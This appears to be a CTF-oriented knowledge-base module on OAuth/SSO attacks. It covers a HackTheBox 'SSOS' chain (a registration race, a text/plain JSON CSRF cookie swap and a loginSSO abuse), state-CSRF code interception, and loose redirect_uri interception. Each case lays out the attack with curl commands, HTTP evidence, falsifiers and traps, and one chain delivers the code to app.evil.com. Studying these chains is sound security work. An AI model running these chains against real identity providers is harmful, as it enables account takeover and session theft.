# Real-world cases — the OAuth/SSO shapes that have been solved, with the full mechanics

The real-world-cases module names the shapes that have been solved. This
module carries the full mechanics — the preconditions, the chain, the
evidence, the falsifiers, and the traps at every step.

## Case 1 — SSOS (HackTheBox)

**The stack**: Node.js, Express, EJS, passport-oauth2, Go, Gin, GORM, Nginx, Puppeteer.

**The preconditions**:

- SSO login ignores credential arguments and authorizes using whatever
  token cookie is in the shared browser jar.
- JSON-binding API parses raw JSON regardless of `Content-Type`.
- SSO token cookie is HttpOnly without `SameSite`.
- Registration endpoint allows pre-registration of a fixed account later
  used by the bot.
- A bot visiting user-supplied URLs with a shared cookie jar.
- A flag submitted once at bot startup.

**The signals**:

`oauth2`, `single sign on`, `jsessionid`, `connect.sid`, `registration race`,
`cookie swap`, `text/plain json csrf`, `shouldbindjson`, `puppeteer`,
`submit-url`, missing `samesite`, `loginSSO`, shared cookie jar.

**The chain**:

```
step 1 — the pre-registration race
  for i in $(seq 1 50); do curl -X POST $BASE/api/register -d
      '{"email":"student@domain","password":"own"}' & done
  → the account is registered with the attacker's password

step 2 — the cookie swap
  a data:text/html URL carries a form that POSTs to the IdP's
  /api/login with Content-Type: text/plain — the raw JSON lands
  → the Set-Cookie overwrites the shared jar's SSO token

step 3 — the loginSSO step
  the app's loginSSO reads the jar's token — the swapped one — and
  issues a session on the attacker's account

step 4 — the flag is submitted
  the bot's submitAssignment step writes the flag to /submission/1
  → GET /submission/1 — the flag is on the attacker's owned account
```

**The evidence**:

```
HTTP/1.1 200 OK
{"status": "registered"}
```

followed by:

```
HTTP/1.1 200 OK
Set-Cookie: token=NEW_TOKEN; HttpOnly; Path=/
{"status": "ok"}
```

followed by:

```
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=xyz789; HttpOnly; Path=/
```

followed by:

```
HTTP/1.1 200 OK
{"flag": "HTB{...}"}
```

**The falsifiers**:

- The account is already registered with an unknown random password —
  the race is lost.
- The SSO token cookie has `SameSite=Lax` or `Strict` — the swap is dead.
- The `loginSSO` step reads credentials, not the jar's token — the swap
  is dead.
- The `redirect_uri` is strictly validated — the code-interception shape
  is dead.
- The `state` is bound to the session — the CSRF shape is dead.

**The traps**:

- Registration race alone is insufficient — the CSRF uses
  `enctype=text/plain` and a JSON-name trick, not URL-encoded data.
- The bot's internal Nginx port differs from the external mapped port —
  the `redirect_uri` is validated against the internal hostname:port.
- `redirect_uri` validation is strict about hostname and port — a wrong
  port returns `400 invalid redirect_uri`.
- Code exchange still requires the client secret — the cookie swap works
  because the bot performs the exchange.
- An already-started instance is permanently consumed — the flag was
  submitted once at startup into an unreadable account.

## Case 2 — the state-CSRF code interception

**The stack**: a custom IdP that accepts any `state` without binding it to
the session.

**The preconditions**:

- `state` is not bound to the session — the callback accepts a `state` that
  was issued for a different session.
- `code` is not bound to `state` — a code minted with `state_A` is
  exchangeable with `state_B`.

**The chain**:

```
step 1 — the attacker starts a flow
  curl -b $JAR -L $BASE/login → capture the authorize URL with state_A

step 2 — the victim visits the attacker's authorize URL
  the victim's browser issues the authorize request → the IdP 302s to
  https://app/callback?code=VICTIM_CODE&state=state_A

step 3 — the callback accepts state_A
  the app does not verify that state_A was issued for the victim's
  session — it accepts the code and issues a session on the victim's
  account
```

**The evidence**:

```
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=victim_session; HttpOnly; Path=/
```

**The falsifier**:

```
HTTP/1.1 400 Bad Request
{"error": "state mismatch"}
```

## Case 3 — the loose `redirect_uri` code interception

**The stack**: a custom IdP that validates `redirect_uri` against a prefix,
not an exact match.

**The preconditions**:

- `redirect_uri` is validated against a prefix — `https://app` matches
  `https://app.evil.com`.
- `code` is not bound to `redirect_uri` — a code minted for `redirect_uri=A`
  is exchangeable with `redirect_uri=B`.

**The chain**:

```
step 1 — authorize with the loose URI
  curl "https://idp/authorize?client_id=APP&redirect_uri=https://app.evil.com/callback&
        response_type=code&state=XYZ"

step 2 — the code is delivered
  the IdP 302s to https://app.evil.com/callback?code=ABC&state=XYZ —
  the code is in the attacker's hands

step 3 — replay against the app's callback
  curl -b $JAR "https://app/callback?code=ABC&state=XYZ" —
  the session is issued on the attacker's account
```

**The evidence**:

```
HTTP/1.1 302 Found
Location: https://app.evil.com/callback?code=ABC&state=XYZ
```

**The falsifier**:

```
HTTP/1.1 400 Bad Request
{"error": "invalid redirect_uri"}
```
